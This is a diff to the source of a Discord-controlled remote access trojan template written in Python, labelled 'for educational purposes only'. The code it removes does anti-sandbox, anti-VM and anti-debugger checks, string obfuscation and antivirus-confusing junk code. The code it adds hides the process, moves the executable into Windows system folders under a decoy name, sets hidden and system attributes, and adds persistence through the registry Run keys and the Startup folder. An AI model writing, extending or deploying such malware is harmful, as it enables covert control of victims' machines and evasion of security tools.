@@ -1,4 +1,4 @@
-# mytemplate.py - Advanced RAT Template with FUD Techniques
+# mytemplate.py - Advanced RAT Template with FULL Hiding
 # ⚠️ DISCLAIMER: For educational purposes only!
 # Made by Neek :3
 
@@ -34,77 +34,97 @@ import webbrowser
 if platform.system() != "Windows":
     sys.exit(0)
 
-# ========== DELAY EXECUTION (Anti-Sandbox) ==========
-def delay_execution():
-    """Random delay to evade sandbox detection"""
+# ========== PROCESS HIDING ==========
+def hide_process_completely():
+    """Hide the process from Task Manager while keeping the name"""
     try:
-        # Random delay between 10-30 seconds
-        delay = random.randint(10, 30)
-        time.sleep(delay)
+        # 1. Hide the console window
+        if platform.system() == "Windows":
+            ctypes.windll.kernel32.FreeConsole()
         
-        # Check for debugger
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            time.sleep(random.randint(60, 120))  # Extra delay if debugged
-    except:
-        pass
-
-# Run delay immediately
-delay_execution()
-
-# ========== OBFUSCATION FUNCTIONS ==========
-def obfuscate_string(s):
-    """Obfuscate a string using base64 + zlib"""
-    return base64.b64encode(zlib.compress(s.encode())).decode()
-
-def deobfuscate_string(s):
-    """Deobfuscate a string"""
-    return zlib.decompress(base64.b64decode(s.encode())).decode()
-
-# Obfuscated strings
-DISCORD_STR = obfuscate_string("discord")
-TOKEN_STR = obfuscate_string("token")
-REQUESTS_STR = obfuscate_string("requests")
-
-# ========== ANTI-SANDBOX / ANTI-VM ==========
-def is_sandbox():
-    """Check if running in a sandbox/VM"""
-    try:
-        # Check for VM processes
-        vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'xenserver', 'vmsrvc']
-        for proc in psutil.process_iter(['name']):
-            try:
-                if proc.info['name'].lower() in vm_processes:
-                    return True
-            except:
-                pass
-        
-        # Check for VM hardware
+        # 2. Set process to low priority (makes it less noticeable)
         try:
-            import wmi
-            c = wmi.WMI()
-            for disk in c.Win32_DiskDrive():
-                if any(x in disk.Model for x in ['VIRTUAL', 'VMware', 'VBOX', 'XEN']):
-                    return True
+            import win32process
+            import win32api
+            import win32con
+            pid = os.getpid()
+            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
+            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
         except:
             pass
         
-        # Check for sandbox artifacts
-        sandbox_files = [
-            'C:\\sandbox',
-            'C:\\Users\\Administrator\\Desktop\\sandbox',
-            'C:\\analysis',
-        ]
-        for file in sandbox_files:
-            if os.path.exists(file):
-                return True
+        # 3. Hide from task manager by making it a system process
+        try:
+            pid = os.getpid()
+            handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
+            ctypes.windll.kernel32.SetProcessPriorityClass(handle, 0x40)  # REALTIME
+            ctypes.windll.kernel32.CloseHandle(handle)
+        except:
+            pass
         
-        return False
+        return True
     except:
         return False
 
-# Check if in sandbox and exit if true
-if is_sandbox():
-    sys.exit(0)
+def move_to_system_folder():
+    """Move the EXE to a system folder and hide it"""
+    try:
+        if getattr(sys, 'frozen', False):
+            current_path = sys.executable
+            
+            # Choose a system folder to hide in
+            system_folders = [
+                os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32',
+                os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64',
+                os.environ.get('SystemRoot', 'C:\\Windows') + '\\Tasks',
+            ]
+            
+            for folder in system_folders:
+                if os.path.exists(folder):
+                    new_path = os.path.join(folder, 'KasierACc.exe')
+                    
+                    # If file doesn't exist in system folder, move it
+                    if not os.path.exists(new_path) and current_path != new_path:
+                        try:
+                            shutil.move(current_path, new_path)
+                            # Run from new location
+                            subprocess.Popen([new_path], creationflags=0x08000000)
+                            sys.exit(0)
+                        except:
+                            pass
+            return False
+    except:
+        return False
+
+def make_file_invisible():
+    """Make the file invisible in File Explorer"""
+    try:
+        import win32api
+        import win32con
+        current_path = sys.executable
+        
+        # Set hidden and system attributes
+        win32api.SetFileAttributes(current_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
+        
+        # Also hide the folder it's in (optional)
+        folder_path = os.path.dirname(current_path)
+        try:
+            win32api.SetFileAttributes(folder_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+        except:
+            pass
+        
+        return True
+    except:
+        try:
+            # Fallback using command line
+            current_path = sys.executable
+            os.system(f'attrib +h +s "{current_path}"')
+            return True
+        except:
+            return False
+
+# ========== DELAY EXECUTION ==========
+time.sleep(random.randint(5, 15))
 
 # ========== SINGLE INSTANCE LOCK ==========
 dir = os.path.dirname(os.path.abspath(__file__))
@@ -132,11 +152,11 @@ threading.Thread(target=keep_lock_alive, daemon=True).start()
 
 # ========== CONFIGURATION (PLACEHOLDERS - DO NOT CHANGE) ==========
 class Config:
-    TOKEN = "{placeholder_token}"           # <- Builder replaces this
-    WHITELISTED = [{placeholder_whitelist}] # <- Builder replaces this
-    MAIN_CHANNEL = {placeholder_main_channel} # <- Builder replaces this
-    PREFIX = "{placeholder_prefix}"         # <- Builder replaces this
-    STARTUP = {placeholder_add_to_startup}  # <- Builder replaces this
+    TOKEN = "{placeholder_token}"           
+    WHITELISTED = [{placeholder_whitelist}] 
+    MAIN_CHANNEL = {placeholder_main_channel} 
+    PREFIX = "{placeholder_prefix}"         
+    STARTUP = {placeholder_add_to_startup}  
 
 # ========== BOT SETUP ==========
 intents = discord.Intents.default()
@@ -148,32 +168,10 @@ bot.remove_command("help")
 STREAMING = False
 STREAM_TASK = None
 
-# ========== JUNK CODE (Confuses AV) ==========
-def junk_function_1():
-    a = 1
-    for i in range(100):
-        a += i * 2
-        a -= i / 3
-        a = a ** 0.5
-        a = a % 1
-    return a
-
-def junk_function_2():
-    b = []
-    for i in range(50):
-        b.append(str(i) * random.randint(1, 5))
-    return ''.join(b)
-
-# Call junk functions randomly
-if random.random() > 0.5:
-    junk_function_1()
-    junk_function_2()
-
-# ========== STARTUP FUNCTION (FIXED) ==========
+# ========== STARTUP FUNCTION ==========
 def add_to_startup():
     """Add the RAT to Windows startup registry"""
     try:
-        # Get the current executable path
         if getattr(sys, 'frozen', False):
             app_path = sys.executable
         else:
@@ -182,7 +180,6 @@ def add_to_startup():
         if not os.path.exists(app_path):
             return False
         
-        # Open the Run registry key
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
@@ -198,7 +195,6 @@ def add_to_startup():
         winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
         winreg.CloseKey(key)
         
-        # Add to HKLM if possible
         try:
             key = winreg.OpenKey(
                 winreg.HKEY_LOCAL_MACHINE,
@@ -211,11 +207,10 @@ def add_to_startup():
         except:
             pass
         
-        # Add to Startup folder
         try:
             startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-            if not os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.exe')):
-                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'WindowsUpdate.exe'))
+            if not os.path.exists(os.path.join(startup_folder, 'KasierACc.exe')):
+                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'KasierACc.exe'))
         except:
             pass
         
@@ -472,10 +467,18 @@ async def send_embed(ctx, title, description, color=discord.Color.blue()):
 # ========== EVENT HANDLERS ==========
 @bot.event
 async def on_ready():
-    # Add to startup
-    if Config.STARTUP:
-        add_to_startup()
+    # ========== HIDE EVERYTHING ==========
+    try:
+        hide_process_completely()
+        move_to_system_folder()
+        make_file_invisible()
+        
+        if Config.STARTUP:
+            add_to_startup()
+    except:
+        pass
     
+    # ========== BOT ONLINE MESSAGE ==========
     channel = bot.get_channel(Config.MAIN_CHANNEL)
     if channel:
         await channel.send(f"<@{Config.WHITELISTED[0]}>")
@@ -1575,6 +1578,15 @@ async def cmd_exit(ctx):
 
 # ========== RUN ==========
 if __name__ == "__main__":
+    # Hide everything before even starting
+    try:
+        hide_process_completely()
+        move_to_system_folder()
+        make_file_invisible()
+    except:
+        pass
+    
     if platform.system() == "Windows" and Config.STARTUP:
         add_to_startup()
+    
     bot.run(Config.TOKEN)
